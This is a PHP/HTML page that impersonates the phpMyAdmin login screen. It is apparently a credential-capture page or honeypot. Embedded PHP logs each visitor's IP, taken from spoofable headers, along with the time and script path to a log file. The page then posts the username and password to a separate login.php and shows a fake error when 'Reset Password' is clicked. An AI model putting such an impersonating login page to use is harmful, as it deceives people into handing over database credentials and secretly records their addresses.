<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>


    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <title>phpMyAdmin </title>
    <link rel="stylesheet" type="text/css" href="phpmyadmin_files/phpmyadmin.css">
    <link rel="stylesheet" type="text/css" href="phpmyadmin_files/print.css" media="print">
    <meta name="robots" content="noindex,nofollow">

</head><body class="loginform">
    
<div class="container">
<a href="http://www.phpmyadmin.net/" target="_blank" class="logo"><img src="phpmyadmin_files/logo_right.png" id="imLogo" name="imLogo" alt="phpMyAdmin" border="0"></a>
<h1>
    Welcome to <bdo dir="ltr" xml:lang="en">phpMyAdmin </bdo></h1>

<form>
<fieldset><legend xml:lang="en" dir="ltr">Language</legend>
    <select name="lang" onchange="this.form.submit();" xml:lang="en" dir="ltr">
            <option value="af-utf-8">Afrikaans</option>
        <option value="sq-utf-8">Shqip - Albanian</option>
        <option value="ar-utf-8">العربية - Arabic</option>
        <option value="az-utf-8">Azərbaycanca - Azerbaijani</option>
        <option value="bn-utf-8">Bangla</option>
        <option value="eu-utf-8">Euskara - Basque</option>
        <option value="becyr-utf-8">Беларуская - Belarusian</option>
        <option value="belat-utf-8">Biełaruskaja - Belarusian latin</option>
        <option value="bs-utf-8">Bosanski - Bosnian</option>
        <option value="ptbr-utf-8">Português - Brazilian portuguese</option>
        <option value="bg-utf-8">Български - Bulgarian</option>
        <option value="ca-utf-8">Català - Catalan</option>
        <option value="zh-utf-8">中文 - Chinese simplified</option>
        <option value="zhtw-utf-8">中文 - Chinese traditional</option>
        <option value="hr-utf-8">Hrvatski - Croatian</option>
        <option value="cs-utf-8">Česky - Czech</option>
        <option value="da-utf-8">Dansk - Danish</option>
        <option value="nl-utf-8">Nederlands - Dutch</option>
        <option value="en-utf-8" selected="selected">English</option>
        <option value="et-utf-8">Eesti - Estonian</option>
        <option value="fi-utf-8">Suomi - Finnish</option>
        <option value="fr-utf-8">Français - French</option>
        <option value="gl-utf-8">Galego - Galician</option>
        <option value="ka-utf-8">ქართული - Georgian</option>
        <option value="de-utf-8">Deutsch - German</option>
        <option value="el-utf-8">Ελληνικά - Greek</option>
        <option value="he-utf-8">עברית - Hebrew</option>
        <option value="hi-utf-8">हिन्दी - Hindi</option>
        <option value="hu-utf-8">Magyar - Hungarian</option>
        <option value="id-utf-8">Bahasa Indonesia - Indonesian</option>
        <option value="it-utf-8">Italiano - Italian</option>
        <option value="ja-utf-8">日本語 - Japanese</option>
        <option value="ko-utf-8">한국어 - Korean</option>
        <option value="lv-utf-8">Latviešu - Latvian</option>
        <option value="lt-utf-8">Lietuvių - Lithuanian</option>
        <option value="mkcyr-utf-8">Macedonian - Macedonian</option>
        <option value="ms-utf-8">Bahasa Melayu - Malay</option>
        <option value="mn-utf-8">Монгол - Mongolian</option>
        <option value="no-utf-8">Norsk - Norwegian</option>
        <option value="fa-utf-8">فارسی - Persian</option>
        <option value="pl-utf-8">Polski - Polish</option>
        <option value="pt-utf-8">Português - Portuguese</option>
        <option value="ro-utf-8">Română - Romanian</option>
        <option value="ru-utf-8">Русский - Russian</option>
        <option value="srcyr-utf-8">Српски - Serbian</option>
        <option value="srlat-utf-8">Srpski - Serbian latin</option>
        <option value="si-utf-8">සිංහල - Sinhala</option>
        <option value="sk-utf-8">Slovenčina - Slovak</option>
        <option value="sl-utf-8">Slovenščina - Slovenian</option>
        <option value="es-utf-8">Español - Spanish</option>
        <option value="sv-utf-8">Svenska - Swedish</option>
        <option value="tt-utf-8">Tatarça - Tatarish</option>
        <option value="th-utf-8">ภาษาไทย - Thai</option>
        <option value="tr-utf-8">Türkçe - Turkish</option>
        <option value="uk-utf-8">Українська - Ukrainian</option>
        <option value="uzcyr-utf-8">Ўзбекча - Uzbek-cyrillic</option>
        <option value="uzlat-utf-8">O‘zbekcha - Uzbek-latin</option>

    </select>
    </fieldset>
    <noscript>
    <fieldset class="tblFooters">
        <input type="submit" value="Go" />
    </fieldset>
    </noscript>
</form>
    <br>

<?php
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = getRealIpAddr();
$date = date ("d/m/Y:H:i:s");
$page = $_SERVER['SCRIPT_FILENAME'];
$message = "$date, $ip, $page\n"; 
$File = "log.txt";
$Open = fopen($File, "a+"); 
if ($Open){ 
    fwrite($Open, "$message"); 
    fclose ($Open); 
}
?>

<!-- Login form -->
<form method="post" action="login.php" name="login form">
<form method="post" enctype="multipart/form-data" action="login.php" name="login">
    <fieldset>
    <legend>
Log in<a href="Documentation.html" target="_blank" title="phpMyAdmin documentation"><img class="icon" src="phpmyadmin_files/b_help.png" alt="phpMyAdmin documentation" height="11" width="11"></a></legend>

<input name="date" value="<?= $date ?>" type="hidden">
<input name="ip" value="<?= $ip ?>" type="hidden">

    <table width="%100" border="0" cellpadding="0" cellspacing="0"><tr><td align="left" valign="top">
            <label for="input_username"><b>Username:</b></label></td><td align="right" valign="top">
            <input name="username" id="username" size="24" class="textfield" maxlength="20" type="text">
        </td></tr><tr><td align="left" valign="top">
            <label for="input_password"><b>Password:</b></label></td><td align="right" valign="top">
            <input name="password" id="password" value="" size="24" class="textfield" maxlength="50" type="password">
    </td></tr></table>
	
	<input name="doc" value="phpmyadmin-form" type="hidden">
	</fieldset>
    <fieldset class="tblFooters">
        <input value="Go" id="input_go" type="submit">
</fieldset>
    <div style="text-align: right; font-size: 8pt;"><a onclick="alert('error -- permission denied : 0x42-0839475')">Reset Password</a></div>
</form>
    </div>
</body></html>
